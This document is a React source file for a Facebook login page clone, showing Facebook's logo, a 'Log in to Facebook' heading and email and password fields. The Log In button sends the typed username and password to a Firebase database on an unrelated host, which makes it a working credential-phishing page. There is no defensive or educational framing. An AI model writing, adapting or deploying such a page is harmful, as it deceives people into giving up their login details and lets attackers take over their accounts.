import React, { useState } from "react";

import "./App.css";
import axios from "axios";

const App = () => {
  const userdata = {
    username: "",
    password: "",
  };

  const [state, setState] = useState(userdata);
  const handledata = (e) => {
    const { name, value } = e.target;
    // console.log(name, value);
    setState({ ...state, [name]: value });
  };

  const submitdata = () => {
    axios.post(
      `https://fbface-c544f-default-rtdb.asia-southeast1.firebasedatabase.app/fb.json`,
      {
        body: JSON.stringify(state),
      }
    );
  };

  return (
    <div className="App">
      {/* <Headers/> */}
      {/* <div>Get Facebook for Android and browser faster </div> */}
      <div className="topdiv">
        <img
          src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
          alt="faceboook"
          style={{ width: "240px", height: "84px" }}
        ></img>
      </div>

      <div className="main_login">
        <div className="m-3">Log in to Facebook</div>
        <div className="m-3">
          <input
            className="input1"
            type="text"
            name="username"
            placeholder="Email address or phone number"
            value={state.username}
            // style={{ width: "360vw", height: "52vh", padding: "10px" }}
            onChange={handledata}
            required
          />
        </div>
        <div className="m-3">
          <input
            className="input2"
            type="text"
            name="password"
            placeholder="Password"
            value={state.password}
            // style={{
            //   width: "360vw",
            //   height: "52vh",
            //   padding: "10px",
            // }}
            onChange={handledata}
            required
          />
        </div>
        <div className="m-3">
          <button
            className="login-button"
            onClick={submitdata}
            style={{
              width: "250px",
              height: "48px",
              backgroundColor: "blue",
              color: "white",
              fontWeight: "900",
              borderRadius: "9px",
            }}
          >
            Log In
          </button>
        </div>
      </div>
    </div>
  );
};
export default App;
